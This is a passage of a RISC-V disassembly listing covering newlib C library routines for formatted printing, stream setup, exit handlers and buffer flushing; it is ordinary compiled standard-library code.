   1227e:	02d65f63          	bge	a2,a3,122bc <_vfprintf_r+0x1974>
   12282:	4d9d                	li	s11,7
   12284:	a021                	j	1228c <_vfprintf_r+0x1944>
   12286:	3c41                	addiw	s8,s8,-16
   12288:	038d5a63          	bge	s10,s8,122bc <_vfprintf_r+0x1974>
   1228c:	2705                	addiw	a4,a4,1
   1228e:	07c1                	addi	a5,a5,16
   12290:	01233023          	sd	s2,0(t1)
   12294:	01a33423          	sd	s10,8(t1)
   12298:	f23e                	sd	a5,288(sp)
   1229a:	10e12c23          	sw	a4,280(sp)
   1229e:	0341                	addi	t1,t1,16
   122a0:	feedd3e3          	bge	s11,a4,12286 <_vfprintf_r+0x193e>
   122a4:	0a10                	addi	a2,sp,272
   122a6:	85d2                	mv	a1,s4
   122a8:	8556                	mv	a0,s5
   122aa:	45d060ef          	jal	ra,18f06 <__sprint_r>
   122ae:	a2051d63          	bnez	a0,114e8 <_vfprintf_r+0xba0>
   122b2:	7792                	ld	a5,288(sp)
   122b4:	11812703          	lw	a4,280(sp)
   122b8:	835e                	mv	t1,s7
   122ba:	b7f1                	j	12286 <_vfprintf_r+0x193e>
   122bc:	2705                	addiw	a4,a4,1
   122be:	97e2                	add	a5,a5,s8
   122c0:	01233023          	sd	s2,0(t1)
   122c4:	01833423          	sd	s8,8(t1)
   122c8:	f23e                	sd	a5,288(sp)
   122ca:	10e12c23          	sw	a4,280(sp)
   122ce:	469d                	li	a3,7
   122d0:	8ae6d8e3          	bge	a3,a4,11b80 <_vfprintf_r+0x1238>
   122d4:	0a10                	addi	a2,sp,272
   122d6:	85d2                	mv	a1,s4
   122d8:	8556                	mv	a0,s5
   122da:	42d060ef          	jal	ra,18f06 <__sprint_r>
   122de:	a0051563          	bnez	a0,114e8 <_vfprintf_r+0xba0>
   122e2:	7792                	ld	a5,288(sp)
   122e4:	11812703          	lw	a4,280(sp)
   122e8:	835e                	mv	t1,s7
   122ea:	cedfe06f          	j	10fd6 <_vfprintf_r+0x68e>
   122ee:	04700793          	li	a5,71
   122f2:	01dc88b3          	add	a7,s9,t4
   122f6:	f0be                	sd	a5,96(sp)
   122f8:	b25fe06f          	j	10e1c <_vfprintf_r+0x4d4>
   122fc:	8826                	mv	a6,s1
   122fe:	accff06f          	j	115ca <_vfprintf_r+0xc82>
   12302:	03000793          	li	a5,48
   12306:	0ef10023          	sb	a5,224(sp)
   1230a:	07800713          	li	a4,120
   1230e:	bec1                	j	11ede <_vfprintf_r+0x1596>
   12310:	77aa                	ld	a5,168(sp)
   12312:	8762                	mv	a4,s8
   12314:	fdbe                	sd	a5,248(sp)
   12316:	67c6                	ld	a5,80(sp)
   12318:	fffc4683          	lbu	a3,-1(s8)
   1231c:	00f7c603          	lbu	a2,15(a5)
   12320:	00d61e63          	bne	a2,a3,1233c <_vfprintf_r+0x19f4>
   12324:	03000593          	li	a1,48
   12328:	feb70fa3          	sb	a1,-1(a4)
   1232c:	776e                	ld	a4,248(sp)
   1232e:	fff70693          	addi	a3,a4,-1
   12332:	fdb6                	sd	a3,248(sp)
   12334:	fff74683          	lbu	a3,-1(a4)
   12338:	fed608e3          	beq	a2,a3,12328 <_vfprintf_r+0x19e0>
   1233c:	0016861b          	addiw	a2,a3,1
   12340:	03900593          	li	a1,57
   12344:	0ff67613          	andi	a2,a2,255
   12348:	00b68563          	beq	a3,a1,12352 <_vfprintf_r+0x1a0a>
   1234c:	fec70fa3          	sb	a2,-1(a4)
   12350:	bb39                	j	1206e <_vfprintf_r+0x1726>
   12352:	67c6                	ld	a5,80(sp)
   12354:	00a7c603          	lbu	a2,10(a5)
   12358:	fec70fa3          	sb	a2,-1(a4)
   1235c:	bb09                	j	1206e <_vfprintf_r+0x1726>
   1235e:	001e859b          	addiw	a1,t4,1
   12362:	8556                	mv	a0,s5
   12364:	ec1a                	sd	t1,24(sp)
   12366:	e476                	sd	t4,8(sp)
   12368:	2a2030ef          	jal	ra,1560a <_malloc_r>
   1236c:	6ea2                	ld	t4,8(sp)
   1236e:	6362                	ld	t1,24(sp)
   12370:	8caa                	mv	s9,a0
   12372:	1e050063          	beqz	a0,12552 <_vfprintf_r+0x1c0a>
   12376:	ec2a                	sd	a0,24(sp)
   12378:	b641                	j	11ef8 <_vfprintf_r+0x15b0>
   1237a:	000e9363          	bnez	t4,12380 <_vfprintf_r+0x1a38>
   1237e:	4e85                	li	t4,1
   12380:	69b2                	ld	s3,264(sp)
   12382:	1004ef93          	ori	t6,s1,256
   12386:	6c12                	ld	s8,256(sp)
   12388:	2f81                	sext.w	t6,t6
   1238a:	d609c1e3          	bltz	s3,120ec <_vfprintf_r+0x17a4>
   1238e:	8776                	mv	a4,t4
   12390:	0f810893          	addi	a7,sp,248
   12394:	0ec10813          	addi	a6,sp,236
   12398:	11bc                	addi	a5,sp,232
   1239a:	4689                	li	a3,2
   1239c:	85e2                	mv	a1,s8
   1239e:	864e                	mv	a2,s3
   123a0:	8556                	mv	a0,s5
   123a2:	ec7e                	sd	t6,24(sp)
   123a4:	f01a                	sd	t1,32(sp)
   123a6:	e476                	sd	t4,8(sp)
   123a8:	1f0020ef          	jal	ra,14598 <_ldtoa_r>
   123ac:	6fe2                	ld	t6,24(sp)
   123ae:	ed26                	sd	s1,152(sp)
   123b0:	6ea2                	ld	t4,8(sp)
   123b2:	7302                	ld	t1,32(sp)
   123b4:	8caa                	mv	s9,a0
   123b6:	84fe                	mv	s1,t6
   123b8:	ec02                	sd	zero,24(sp)
   123ba:	e582                	sd	zero,200(sp)
   123bc:	bb61                	j	12154 <_vfprintf_r+0x180c>
   123be:	4e99                	li	t4,6
   123c0:	9fbfe06f          	j	10dba <_vfprintf_r+0x472>
   123c4:	c31c                	sw	a5,0(a4)
   123c6:	8ca2                	mv	s9,s0
   123c8:	813fe06f          	j	10bda <_vfprintf_r+0x292>
   123cc:	06700d93          	li	s11,103
   123d0:	77a6                	ld	a5,104(sp)
   123d2:	0ff00713          	li	a4,255
   123d6:	e882                	sd	zero,80(sp)
   123d8:	0007c783          	lbu	a5,0(a5)
   123dc:	f082                	sd	zero,96(sp)
   123de:	02e78863          	beq	a5,a4,1240e <_vfprintf_r+0x1ac6>
   123e2:	0ff00693          	li	a3,255
   123e6:	6666                	ld	a2,88(sp)
   123e8:	0007871b          	sext.w	a4,a5
   123ec:	02c7d163          	bge	a5,a2,1240e <_vfprintf_r+0x1ac6>
   123f0:	75a6                	ld	a1,104(sp)
   123f2:	40e6073b          	subw	a4,a2,a4
   123f6:	ecba                	sd	a4,88(sp)
   123f8:	0015c783          	lbu	a5,1(a1)
   123fc:	cf8d                	beqz	a5,12436 <_vfprintf_r+0x1aee>
   123fe:	7706                	ld	a4,96(sp)
   12400:	2705                	addiw	a4,a4,1
   12402:	f0ba                	sd	a4,96(sp)
   12404:	00158713          	addi	a4,a1,1
   12408:	f4ba                	sd	a4,104(sp)
   1240a:	fcd79ee3          	bne	a5,a3,123e6 <_vfprintf_r+0x1a9e>
   1240e:	7706                	ld	a4,96(sp)
   12410:	67c6                	ld	a5,80(sp)
   12412:	9fb9                	addw	a5,a5,a4
   12414:	672a                	ld	a4,136(sp)
   12416:	02e787bb          	mulw	a5,a5,a4
   1241a:	018787bb          	addw	a5,a5,s8
   1241e:	00078c1b          	sext.w	s8,a5
   12422:	fffc4993          	not	s3,s8
   12426:	43f9d993          	srai	s3,s3,0x3f
   1242a:	0137f7b3          	and	a5,a5,s3
   1242e:	0007899b          	sext.w	s3,a5
   12432:	b29fe06f          	j	10f5a <_vfprintf_r+0x612>
   12436:	6746                	ld	a4,80(sp)
   12438:	77a6                	ld	a5,104(sp)
   1243a:	2705                	addiw	a4,a4,1
   1243c:	0007c783          	lbu	a5,0(a5)
   12440:	e8ba                	sd	a4,80(sp)
   12442:	b7e1                	j	1240a <_vfprintf_r+0x1ac2>
   12444:	ec02                	sd	zero,24(sp)
   12446:	84be                	mv	s1,a5
   12448:	b16d                	j	120f2 <_vfprintf_r+0x17aa>
   1244a:	85ce                	mv	a1,s3
   1244c:	8562                	mv	a0,s8
   1244e:	fc1a                	sd	t1,56(sp)
   12450:	f876                	sd	t4,48(sp)
   12452:	6d1090ef          	jal	ra,1c322 <__trunctfdf2>
   12456:	11a8                	addi	a0,sp,232
   12458:	23d040ef          	jal	ra,16e94 <frexp>
   1245c:	607090ef          	jal	ra,1c262 <__extenddftf2>
   12460:	0000a797          	auipc	a5,0xa
   12464:	48078793          	addi	a5,a5,1152 # 1c8e0 <zeroes.4521+0x30>
   12468:	6390                	ld	a2,0(a5)
   1246a:	6794                	ld	a3,8(a5)
   1246c:	6f7080ef          	jal	ra,1b362 <__multf3>
   12470:	4601                	li	a2,0
   12472:	4681                	li	a3,0
   12474:	f02a                	sd	a0,32(sp)
   12476:	e42e                	sd	a1,8(sp)
   12478:	507080ef          	jal	ra,1b17e <__eqtf2>
   1247c:	62a2                	ld	t0,8(sp)
   1247e:	7702                	ld	a4,32(sp)
   12480:	7ec2                	ld	t4,48(sp)
   12482:	7362                	ld	t1,56(sp)
   12484:	e119                	bnez	a0,1248a <_vfprintf_r+0x1b42>
   12486:	4785                	li	a5,1
   12488:	d5be                	sw	a5,232(sp)
   1248a:	0000a797          	auipc	a5,0xa
   1248e:	27e78793          	addi	a5,a5,638 # 1c708 <__clzdi2+0x1b4>
   12492:	e8be                	sd	a5,80(sp)
   12494:	bce1                	j	11f6c <_vfprintf_r+0x1624>
   12496:	0f210713          	addi	a4,sp,242
   1249a:	e699                	bnez	a3,124a8 <_vfprintf_r+0x1b60>
   1249c:	03000713          	li	a4,48
   124a0:	0ee10923          	sb	a4,242(sp)
   124a4:	0f310713          	addi	a4,sp,243
   124a8:	0c14                	addi	a3,sp,528
   124aa:	0307879b          	addiw	a5,a5,48
   124ae:	40d706b3          	sub	a3,a4,a3
   124b2:	00f70023          	sb	a5,0(a4)
   124b6:	1216879b          	addiw	a5,a3,289
   124ba:	e13e                	sd	a5,128(sp)
   124bc:	a65fe06f          	j	10f20 <_vfprintf_r+0x5d8>
   124c0:	77c6                	ld	a5,112(sp)
   124c2:	06600d93          	li	s11,102
   124c6:	00e78c3b          	addw	s8,a5,a4
   124ca:	01dc0c3b          	addw	s8,s8,t4
   124ce:	bb81                	j	1221e <_vfprintf_r+0x18d6>
   124d0:	676a                	ld	a4,152(sp)
   124d2:	8b05                	andi	a4,a4,1
   124d4:	e319                	bnez	a4,124da <_vfprintf_r+0x1b92>
   124d6:	a65fe06f          	j	10f3a <_vfprintf_r+0x5f2>
   124da:	a5bfe06f          	j	10f34 <_vfprintf_r+0x5ec>
   124de:	40ec07bb          	subw	a5,s8,a4
   124e2:	2785                	addiw	a5,a5,1
   124e4:	00078c1b          	sext.w	s8,a5
   124e8:	fffc4993          	not	s3,s8
   124ec:	43f9d993          	srai	s3,s3,0x3f
   124f0:	0137f7b3          	and	a5,a5,s3
   124f4:	0007899b          	sext.w	s3,a5
   124f8:	bef1                	j	120d4 <_vfprintf_r+0x178c>
   124fa:	e791                	bnez	a5,12506 <_vfprintf_r+0x1bbe>
   124fc:	4985                	li	s3,1
   124fe:	06600d93          	li	s11,102
   12502:	4c05                	li	s8,1
   12504:	bec1                	j	120d4 <_vfprintf_r+0x178c>
   12506:	77c6                	ld	a5,112(sp)
   12508:	06600d93          	li	s11,102
   1250c:	2785                	addiw	a5,a5,1
   1250e:	01d78ebb          	addw	t4,a5,t4
   12512:	000e8c1b          	sext.w	s8,t4
   12516:	fffc4993          	not	s3,s8
   1251a:	43f9d993          	srai	s3,s3,0x3f
   1251e:	013efeb3          	and	t4,t4,s3
   12522:	000e899b          	sext.w	s3,t4
   12526:	b67d                	j	120d4 <_vfprintf_r+0x178c>
   12528:	871a                	mv	a4,t1
   1252a:	c9aff06f          	j	119c4 <_vfprintf_r+0x107c>
   1252e:	66c2                	ld	a3,16(sp)
   12530:	4298                	lw	a4,0(a3)
   12532:	06a1                	addi	a3,a3,8
   12534:	00070e9b          	sext.w	t4,a4
   12538:	00075363          	bgez	a4,1253e <_vfprintf_r+0x1bf6>
   1253c:	5efd                	li	t4,-1
   1253e:	00144f03          	lbu	t5,1(s0)
   12542:	e836                	sd	a3,16(sp)
   12544:	843e                	mv	s0,a5
   12546:	d36fe06f          	j	10a7c <_vfprintf_r+0x134>
   1254a:	4789                	li	a5,2
   1254c:	e13e                	sd	a5,128(sp)
   1254e:	9d3fe06f          	j	10f20 <_vfprintf_r+0x5d8>
   12552:	010a5783          	lhu	a5,16(s4)
   12556:	0407e793          	ori	a5,a5,64
   1255a:	00fa1823          	sh	a5,16(s4)
   1255e:	e8cfe06f          	j	10bea <_vfprintf_r+0x2a2>

0000000000012562 <vfprintf>:
   12562:	86b2                	mv	a3,a2
   12564:	862e                	mv	a2,a1
   12566:	85aa                	mv	a1,a0
   12568:	8501b503          	ld	a0,-1968(gp) # 1f5d8 <_impure_ptr>
   1256c:	bdcfe06f          	j	10948 <_vfprintf_r>

0000000000012570 <__sbprintf>:
   12570:	0105d783          	lhu	a5,16(a1)
   12574:	0ac5ae03          	lw	t3,172(a1)
   12578:	0125d303          	lhu	t1,18(a1)
   1257c:	0305b883          	ld	a7,48(a1)
   12580:	0405b803          	ld	a6,64(a1)
   12584:	b3010113          	addi	sp,sp,-1232
   12588:	9bf5                	andi	a5,a5,-3
   1258a:	40000713          	li	a4,1024
   1258e:	4c813023          	sd	s0,1216(sp)
   12592:	00f11823          	sh	a5,16(sp)
   12596:	842e                	mv	s0,a1
   12598:	191c                	addi	a5,sp,176
   1259a:	858a                	mv	a1,sp
   1259c:	4a913c23          	sd	s1,1208(sp)
   125a0:	4b213823          	sd	s2,1200(sp)
   125a4:	4c113423          	sd	ra,1224(sp)
   125a8:	892a                	mv	s2,a0
   125aa:	d772                	sw	t3,172(sp)
   125ac:	00611923          	sh	t1,18(sp)
   125b0:	f846                	sd	a7,48(sp)
   125b2:	e0c2                	sd	a6,64(sp)
   125b4:	e03e                	sd	a5,0(sp)
   125b6:	ec3e                	sd	a5,24(sp)
   125b8:	c63a                	sw	a4,12(sp)
   125ba:	d03a                	sw	a4,32(sp)
   125bc:	d402                	sw	zero,40(sp)
   125be:	b8afe0ef          	jal	ra,10948 <_vfprintf_r>
   125c2:	84aa                	mv	s1,a0
   125c4:	02055963          	bgez	a0,125f6 <__sbprintf+0x86>
   125c8:	01015783          	lhu	a5,16(sp)
   125cc:	0407f793          	andi	a5,a5,64
   125d0:	c799                	beqz	a5,125de <__sbprintf+0x6e>
   125d2:	01045783          	lhu	a5,16(s0)
   125d6:	0407e793          	ori	a5,a5,64
   125da:	00f41823          	sh	a5,16(s0)
   125de:	4c813083          	ld	ra,1224(sp)
   125e2:	4c013403          	ld	s0,1216(sp)
   125e6:	4b013903          	ld	s2,1200(sp)
   125ea:	8526                	mv	a0,s1
   125ec:	4b813483          	ld	s1,1208(sp)
   125f0:	4d010113          	addi	sp,sp,1232
   125f4:	8082                	ret
   125f6:	858a                	mv	a1,sp
   125f8:	854a                	mv	a0,s2
   125fa:	354000ef          	jal	ra,1294e <_fflush_r>
   125fe:	d569                	beqz	a0,125c8 <__sbprintf+0x58>
   12600:	54fd                	li	s1,-1
   12602:	b7d9                	j	125c8 <__sbprintf+0x58>

0000000000012604 <__swsetup_r>:
   12604:	1101                	addi	sp,sp,-32
   12606:	e822                	sd	s0,16(sp)
   12608:	e426                	sd	s1,8(sp)
   1260a:	ec06                	sd	ra,24(sp)
   1260c:	8501b783          	ld	a5,-1968(gp) # 1f5d8 <_impure_ptr>
   12610:	84aa                	mv	s1,a0
   12612:	842e                	mv	s0,a1
   12614:	c399                	beqz	a5,1261a <__swsetup_r+0x16>
   12616:	4bb8                	lw	a4,80(a5)
   12618:	cf49                	beqz	a4,126b2 <__swsetup_r+0xae>
   1261a:	01041703          	lh	a4,16(s0)
   1261e:	03071793          	slli	a5,a4,0x30
   12622:	00877693          	andi	a3,a4,8
   12626:	93c1                	srli	a5,a5,0x30
   12628:	c29d                	beqz	a3,1264e <__swsetup_r+0x4a>
   1262a:	6c14                	ld	a3,24(s0)
   1262c:	ce9d                	beqz	a3,1266a <__swsetup_r+0x66>
   1262e:	0017f613          	andi	a2,a5,1
   12632:	ce39                	beqz	a2,12690 <__swsetup_r+0x8c>
   12634:	5010                	lw	a2,32(s0)
   12636:	00042623          	sw	zero,12(s0)
   1263a:	4501                	li	a0,0
   1263c:	40c0063b          	negw	a2,a2
   12640:	d410                	sw	a2,40(s0)
   12642:	ceb9                	beqz	a3,126a0 <__swsetup_r+0x9c>
   12644:	60e2                	ld	ra,24(sp)
   12646:	6442                	ld	s0,16(sp)
   12648:	64a2                	ld	s1,8(sp)
   1264a:	6105                	addi	sp,sp,32
   1264c:	8082                	ret
   1264e:	0107f693          	andi	a3,a5,16
   12652:	cac1                	beqz	a3,126e2 <__swsetup_r+0xde>
   12654:	8b91                	andi	a5,a5,4
   12656:	e3b5                	bnez	a5,126ba <__swsetup_r+0xb6>
   12658:	6c14                	ld	a3,24(s0)
   1265a:	00876713          	ori	a4,a4,8
   1265e:	03071793          	slli	a5,a4,0x30
   12662:	00e41823          	sh	a4,16(s0)
   12666:	93c1                	srli	a5,a5,0x30
   12668:	f2f9                	bnez	a3,1262e <__swsetup_r+0x2a>
   1266a:	2807f613          	andi	a2,a5,640
   1266e:	20000593          	li	a1,512
   12672:	fab60ee3          	beq	a2,a1,1262e <__swsetup_r+0x2a>
   12676:	85a2                	mv	a1,s0
   12678:	8526                	mv	a0,s1
   1267a:	6d5020ef          	jal	ra,1554e <__smakebuf_r>
   1267e:	01041703          	lh	a4,16(s0)
   12682:	6c14                	ld	a3,24(s0)
   12684:	03071793          	slli	a5,a4,0x30
   12688:	93c1                	srli	a5,a5,0x30
   1268a:	0017f613          	andi	a2,a5,1
   1268e:	f25d                	bnez	a2,12634 <__swsetup_r+0x30>
   12690:	0027f613          	andi	a2,a5,2
   12694:	4581                	li	a1,0
   12696:	e211                	bnez	a2,1269a <__swsetup_r+0x96>
   12698:	500c                	lw	a1,32(s0)
   1269a:	c44c                	sw	a1,12(s0)
   1269c:	4501                	li	a0,0
   1269e:	f2dd                	bnez	a3,12644 <__swsetup_r+0x40>
   126a0:	0807f793          	andi	a5,a5,128
   126a4:	d3c5                	beqz	a5,12644 <__swsetup_r+0x40>
   126a6:	04076713          	ori	a4,a4,64
   126aa:	00e41823          	sh	a4,16(s0)
   126ae:	557d                	li	a0,-1
   126b0:	bf51                	j	12644 <__swsetup_r+0x40>
   126b2:	853e                	mv	a0,a5
   126b4:	530000ef          	jal	ra,12be4 <__sinit>
   126b8:	b78d                	j	1261a <__swsetup_r+0x16>
   126ba:	6c2c                	ld	a1,88(s0)
   126bc:	cd81                	beqz	a1,126d4 <__swsetup_r+0xd0>
   126be:	07440793          	addi	a5,s0,116
   126c2:	00f58763          	beq	a1,a5,126d0 <__swsetup_r+0xcc>
   126c6:	8526                	mv	a0,s1
   126c8:	64e000ef          	jal	ra,12d16 <_free_r>
   126cc:	01041703          	lh	a4,16(s0)
   126d0:	04043c23          	sd	zero,88(s0)
   126d4:	6c14                	ld	a3,24(s0)
   126d6:	fdb77713          	andi	a4,a4,-37
   126da:	00042423          	sw	zero,8(s0)
   126de:	e014                	sd	a3,0(s0)
   126e0:	bfad                	j	1265a <__swsetup_r+0x56>
   126e2:	47a5                	li	a5,9
   126e4:	c09c                	sw	a5,0(s1)
   126e6:	04076713          	ori	a4,a4,64
   126ea:	00e41823          	sh	a4,16(s0)
   126ee:	557d                	li	a0,-1
   126f0:	bf91                	j	12644 <__swsetup_r+0x40>

00000000000126f2 <__call_exitprocs>:
   126f2:	715d                	addi	sp,sp,-80
   126f4:	f052                	sd	s4,32(sp)
   126f6:	8301ba03          	ld	s4,-2000(gp) # 1f5b8 <_global_impure_ptr>
   126fa:	f84a                	sd	s2,48(sp)
   126fc:	1f8a3903          	ld	s2,504(s4)
   12700:	e486                	sd	ra,72(sp)
   12702:	e0a2                	sd	s0,64(sp)
   12704:	fc26                	sd	s1,56(sp)
   12706:	f44e                	sd	s3,40(sp)
   12708:	ec56                	sd	s5,24(sp)
   1270a:	e85a                	sd	s6,16(sp)
   1270c:	e45e                	sd	s7,8(sp)
   1270e:	e062                	sd	s8,0(sp)
   12710:	02090863          	beqz	s2,12740 <__call_exitprocs+0x4e>
   12714:	8b2a                	mv	s6,a0
   12716:	8bae                	mv	s7,a1
   12718:	4a85                	li	s5,1
   1271a:	59fd                	li	s3,-1
   1271c:	00892483          	lw	s1,8(s2)
   12720:	fff4841b          	addiw	s0,s1,-1
   12724:	00044e63          	bltz	s0,12740 <__call_exitprocs+0x4e>
   12728:	048e                	slli	s1,s1,0x3
   1272a:	94ca                	add	s1,s1,s2
   1272c:	020b8663          	beqz	s7,12758 <__call_exitprocs+0x66>
   12730:	2084b783          	ld	a5,520(s1)
   12734:	03778263          	beq	a5,s7,12758 <__call_exitprocs+0x66>
   12738:	347d                	addiw	s0,s0,-1
   1273a:	14e1                	addi	s1,s1,-8
   1273c:	ff3418e3          	bne	s0,s3,1272c <__call_exitprocs+0x3a>
   12740:	60a6                	ld	ra,72(sp)
   12742:	6406                	ld	s0,64(sp)
   12744:	74e2                	ld	s1,56(sp)
   12746:	7942                	ld	s2,48(sp)
   12748:	79a2                	ld	s3,40(sp)
   1274a:	7a02                	ld	s4,32(sp)
   1274c:	6ae2                	ld	s5,24(sp)
   1274e:	6b42                	ld	s6,16(sp)
   12750:	6ba2                	ld	s7,8(sp)
   12752:	6c02                	ld	s8,0(sp)
   12754:	6161                	addi	sp,sp,80
   12756:	8082                	ret
   12758:	00892783          	lw	a5,8(s2)
   1275c:	6498                	ld	a4,8(s1)
   1275e:	37fd                	addiw	a5,a5,-1
   12760:	04878463          	beq	a5,s0,127a8 <__call_exitprocs+0xb6>
   12764:	0004b423          	sd	zero,8(s1)
   12768:	db61                	beqz	a4,12738 <__call_exitprocs+0x46>
   1276a:	31092783          	lw	a5,784(s2)
   1276e:	008a96bb          	sllw	a3,s5,s0
   12772:	00892c03          	lw	s8,8(s2)
   12776:	8ff5                	and	a5,a5,a3
   12778:	2781                	sext.w	a5,a5
   1277a:	ef89                	bnez	a5,12794 <__call_exitprocs+0xa2>
   1277c:	9702                	jalr	a4
   1277e:	00892703          	lw	a4,8(s2)
   12782:	1f8a3783          	ld	a5,504(s4)
   12786:	01871463          	bne	a4,s8,1278e <__call_exitprocs+0x9c>
   1278a:	faf907e3          	beq	s2,a5,12738 <__call_exitprocs+0x46>
   1278e:	dbcd                	beqz	a5,12740 <__call_exitprocs+0x4e>
   12790:	893e                	mv	s2,a5
   12792:	b769                	j	1271c <__call_exitprocs+0x2a>
   12794:	31492783          	lw	a5,788(s2)
   12798:	1084b583          	ld	a1,264(s1)
   1279c:	8ff5                	and	a5,a5,a3
   1279e:	2781                	sext.w	a5,a5
   127a0:	e799                	bnez	a5,127ae <__call_exitprocs+0xbc>
   127a2:	855a                	mv	a0,s6
   127a4:	9702                	jalr	a4
   127a6:	bfe1                	j	1277e <__call_exitprocs+0x8c>
   127a8:	00892423          	sw	s0,8(s2)
   127ac:	bf75                	j	12768 <__call_exitprocs+0x76>
   127ae:	852e                	mv	a0,a1
   127b0:	9702                	jalr	a4
   127b2:	b7f1                	j	1277e <__call_exitprocs+0x8c>

00000000000127b4 <__sflush_r>:
   127b4:	01059783          	lh	a5,16(a1)
   127b8:	7179                	addi	sp,sp,-48
   127ba:	f022                	sd	s0,32(sp)
   127bc:	e44e                	sd	s3,8(sp)
   127be:	f406                	sd	ra,40(sp)
   127c0:	ec26                	sd	s1,24(sp)
   127c2:	e84a                	sd	s2,16(sp)
   127c4:	0087f693          	andi	a3,a5,8
   127c8:	842e                	mv	s0,a1
   127ca:	89aa                	mv	s3,a0
   127cc:	eecd                	bnez	a3,12886 <__sflush_r+0xd2>
   127ce:	6705                	lui	a4,0x1
   127d0:	80070713          	addi	a4,a4,-2048 # 800 <register_fini-0xf8b0>
   127d4:	4594                	lw	a3,8(a1)
   127d6:	8fd9                	or	a5,a5,a4
   127d8:	00f59823          	sh	a5,16(a1)
   127dc:	10d05363          	blez	a3,128e2 <__sflush_r+0x12e>
   127e0:	6438                	ld	a4,72(s0)
   127e2:	cb51                	beqz	a4,12876 <__sflush_r+0xc2>
   127e4:	0009a483          	lw	s1,0(s3)
   127e8:	03079693          	slli	a3,a5,0x30
   127ec:	0009a023          	sw	zero,0(s3)
   127f0:	03379613          	slli	a2,a5,0x33
   127f4:	780c                	ld	a1,48(s0)
   127f6:	92c1                	srli	a3,a3,0x30
   127f8:	0e064963          	bltz	a2,128ea <__sflush_r+0x136>
   127fc:	4601                	li	a2,0
   127fe:	4685                	li	a3,1
   12800:	854e                	mv	a0,s3
   12802:	9702                	jalr	a4
   12804:	57fd                	li	a5,-1
   12806:	862a                	mv	a2,a0
   12808:	10f50963          	beq	a0,a5,1291a <__sflush_r+0x166>
   1280c:	01045683          	lhu	a3,16(s0)
   12810:	6438                	ld	a4,72(s0)
   12812:	780c                	ld	a1,48(s0)
   12814:	8a91                	andi	a3,a3,4
   12816:	c699                	beqz	a3,12824 <__sflush_r+0x70>
   12818:	4414                	lw	a3,8(s0)
   1281a:	6c3c                	ld	a5,88(s0)
   1281c:	8e15                	sub	a2,a2,a3
   1281e:	c399                	beqz	a5,12824 <__sflush_r+0x70>
   12820:	583c                	lw	a5,112(s0)
   12822:	8e1d                	sub	a2,a2,a5
   12824:	4681                	li	a3,0
   12826:	854e                	mv	a0,s3
   12828:	9702                	jalr	a4
   1282a:	57fd                	li	a5,-1
   1282c:	0cf51163          	bne	a0,a5,128ee <__sflush_r+0x13a>
   12830:	0009a703          	lw	a4,0(s3)
   12834:	01041783          	lh	a5,16(s0)
   12838:	0e070f63          	beqz	a4,12936 <__sflush_r+0x182>
   1283c:	46f5                	li	a3,29
   1283e:	00d70563          	beq	a4,a3,12848 <__sflush_r+0x94>
   12842:	46d9                	li	a3,22
   12844:	0ed71f63          	bne	a4,a3,12942 <__sflush_r+0x18e>
   12848:	6c14                	ld	a3,24(s0)
   1284a:	777d                	lui	a4,0xfffff
   1284c:	7ff70713          	addi	a4,a4,2047 # fffffffffffff7ff <__BSS_END__+0xfffffffffffc78ff>
   12850:	8ff9                	and	a5,a5,a4
   12852:	00f41823          	sh	a5,16(s0)
   12856:	00042423          	sw	zero,8(s0)
   1285a:	e014                	sd	a3,0(s0)
   1285c:	6c2c                	ld	a1,88(s0)
   1285e:	0099a023          	sw	s1,0(s3)
   12862:	c991                	beqz	a1,12876 <__sflush_r+0xc2>
   12864:	07440793          	addi	a5,s0,116
   12868:	00f58563          	beq	a1,a5,12872 <__sflush_r+0xbe>
   1286c:	854e                	mv	a0,s3
   1286e:	4a8000ef          	jal	ra,12d16 <_free_r>
   12872:	04043c23          	sd	zero,88(s0)
   12876:	4501                	li	a0,0
   12878:	70a2                	ld	ra,40(sp)
   1287a:	7402                	ld	s0,32(sp)
   1287c:	64e2                	ld	s1,24(sp)
   1287e:	6942                	ld	s2,16(sp)
   12880:	69a2                	ld	s3,8(sp)
   12882:	6145                	addi	sp,sp,48
   12884:	8082                	ret
   12886:	0185b903          	ld	s2,24(a1)
   1288a:	fe0906e3          	beqz	s2,12876 <__sflush_r+0xc2>
   1288e:	6184                	ld	s1,0(a1)
   12890:	03079713          	slli	a4,a5,0x30
   12894:	9341                	srli	a4,a4,0x30
   12896:	8b0d                	andi	a4,a4,3
   12898:	0125b023          	sd	s2,0(a1)
   1289c:	412484bb          	subw	s1,s1,s2
   128a0:	4781                	li	a5,0
   128a2:	e311                	bnez	a4,128a6 <__sflush_r+0xf2>
   128a4:	519c                	lw	a5,32(a1)
   128a6:	c45c                	sw	a5,12(s0)
   128a8:	00904663          	bgtz	s1,128b4 <__sflush_r+0x100>
   128ac:	b7e9                	j	12876 <__sflush_r+0xc2>
   128ae:	992a                	add	s2,s2,a0
   128b0:	fc9053e3          	blez	s1,12876 <__sflush_r+0xc2>
   128b4:	603c                	ld	a5,64(s0)
   128b6:	780c                	ld	a1,48(s0)
   128b8:	86a6                	mv	a3,s1
   128ba:	864a                	mv	a2,s2
   128bc:	854e                	mv	a0,s3
   128be:	9782                	jalr	a5
   128c0:	9c89                	subw	s1,s1,a0
   128c2:	fea046e3          	bgtz	a0,128ae <__sflush_r+0xfa>
   128c6:	01045783          	lhu	a5,16(s0)
   128ca:	70a2                	ld	ra,40(sp)
   128cc:	64e2                	ld	s1,24(sp)
   128ce:	0407e793          	ori	a5,a5,64
   128d2:	00f41823          	sh	a5,16(s0)
   128d6:	7402                	ld	s0,32(sp)
   128d8:	6942                	ld	s2,16(sp)
   128da:	69a2                	ld	s3,8(sp)
   128dc:	557d                	li	a0,-1
   128de:	6145                	addi	sp,sp,48
   128e0:	8082                	ret
   128e2:	59b8                	lw	a4,112(a1)
   128e4:	eee04ee3          	bgtz	a4,127e0 <__sflush_r+0x2c>
   128e8:	b779                	j	12876 <__sflush_r+0xc2>
   128ea:	6850                	ld	a2,144(s0)
   128ec:	b725                	j	12814 <__sflush_r+0x60>
   128ee:	01045783          	lhu	a5,16(s0)
   128f2:	777d                	lui	a4,0xfffff
   128f4:	7ff70713          	addi	a4,a4,2047 # fffffffffffff7ff <__BSS_END__+0xfffffffffffc78ff>
   128f8:	8ff9                	and	a5,a5,a4
   128fa:	6c14                	ld	a3,24(s0)
   128fc:	0107979b          	slliw	a5,a5,0x10
   12900:	4107d79b          	sraiw	a5,a5,0x10
   12904:	00f41823          	sh	a5,16(s0)
   12908:	00042423          	sw	zero,8(s0)
   1290c:	e014                	sd	a3,0(s0)
   1290e:	03379713          	slli	a4,a5,0x33
